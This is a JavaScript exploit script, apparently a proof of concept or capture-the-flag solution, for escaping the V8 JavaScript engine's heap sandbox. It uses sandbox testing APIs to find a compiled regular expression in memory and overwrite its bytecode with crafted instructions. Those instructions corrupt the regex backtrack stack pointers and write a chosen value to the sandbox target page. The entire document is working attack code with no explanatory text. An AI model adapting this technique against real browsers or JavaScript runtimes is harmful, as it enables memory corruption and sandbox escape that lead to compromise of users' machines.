var DEBUG = false;

var buf = new ArrayBuffer(8);
var dv = new DataView(buf);

function assert(x, msg) {
    if (msg === undefined) msg = ""
    if (!x) throw "Assetion failed: " + msg;
}

function dp(o) {
    if (DEBUG) eval("%DebugPrint(o)");
}
function hex(p) {
    return "0x" + p.toString(16);
}

function packU64(l, u) {
  return l | (u << 32n);
}

function u2f(u) {
    dv.setBigUint64(0, u, true);
    return dv.getFloat64(0, true);
}

function f2u(f) {
    dv.setFloat64(0, f, true);
    return dv.getBigUint64(0, true);
}

function s2u(s) { return s >>> 0; }

function lower(u) {
    return s2u(u & 0xffffffff);
}

function upper(u) {
    return parseInt(BigInt(u) >> 32n);
}



function printh(o) {
    console.log(hex(o));
}

function print(o) {
    console.log(o);
}


var memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
var addrof = (o) => Sandbox.getAddressOf(o);

var readHeap4 = (offset) => memory.getUint32(offset, true);
// var readHeap8 = (offset) => memory.getBigUint64(offset, true);
var writeHeap1 = (offset, value) => memory.setUint8(offset, value, true);
var writeHeap4 = (offset, value) => memory.setUint32(offset, value, true);
var writeHeap8 = (offset, value) => memory.setBigUint64(offset, value, true);


re = /a*b/;

re.exec("a".repeat(1) + "b");

print("re @ " + hex(addrof(re)));
reDataAddr = readHeap4(addrof(re) + 0xc);
print("re->data @ " + hex(reDataAddr));
reBytecodeAddr = readHeap4(reDataAddr + 0x1c - 1);
print("re->bytecode @ " + hex(reBytecodeAddr));

function setUseBytecode(ree) {
    let reeDataAddr = readHeap4(addrof(ree) + 0xc);
    let reeCaptureCountAddr = reDataAddr + 0x30 - 1;
    writeHeap4(reeCaptureCountAddr, 0xfffffffe);
}

setUseBytecode(re);

function setBytecode(ree, bytecodeArr) {
    let reeDataAddr = readHeap4(addrof(ree) + 0xc);
    let reeBytecodeAddr = readHeap4(reeDataAddr + 0x1c - 1) - 1;
    let reeBytecodeSize = readHeap4(reeBytecodeAddr + 4) >> 1;
    assert(bytecodeArr.length <= reeBytecodeSize, "bytecode does not fit!");

    for (let i = 0; i < bytecodeArr.length; i++) {
        writeHeap4(reeBytecodeAddr + 4*i + 8, bytecodeArr[i]);
    }
}

function setBytecodeAtOffset(ree, offset, bc) {
    let reeDataAddr = readHeap4(addrof(ree) + 0xc);
    let reeBytecodeAddr = readHeap4(reeDataAddr + 0x1c - 1) - 1;
    let reeBytecodeSize = readHeap4(reeBytecodeAddr + 4) >> 1;
    assert(bc.length == 2, "[opcode, operand]");

    for (let i = 0; i < bc.length; i++) {
        writeHeap4(reeBytecodeAddr + 4*offset + 4*i + 8, bc[i]);
    }
}


const BACKTRACK_END_TO_REGS_OFF = 0x10c;

const PUSH_BT = 2;
const PUSH_REGISTER = 3;
const SET_REGISTER = 4;
const ADVANCE_REGISTER = 9;
const POP_CP = 10;
const POP_REGISTER = 12;
const LOAD_4_CURRENT_CHARS_UNCHECKED = 22;


let sbxLower = lower(Sandbox.targetPage);
let sbxUpper = upper(Sandbox.targetPage);


setBytecode(re, [POP_REGISTER | 0x000,
    PUSH_BT, 0x1, // overwrite backtrack_stack.data_.end_of_storage_
    POP_REGISTER | 0x000, POP_REGISTER | 0x000, POP_REGISTER | 0x000,
    POP_REGISTER | 0x100, ADVANCE_REGISTER | 0x100, BACKTRACK_END_TO_REGS_OFF,
    PUSH_REGISTER | 0x100, // overwrite backtrack_stack.data_.end => &registers.begin_
    PUSH_BT, sbxLower,   // overwrite registers.begin_
    PUSH_BT, sbxUpper,
    SET_REGISTER | 0x000, 0x41414141, // write 0x41414141 to targetPage
    ]);

re.exec("aaaaaaaaaaaaaaaaaaaaaaaaab");
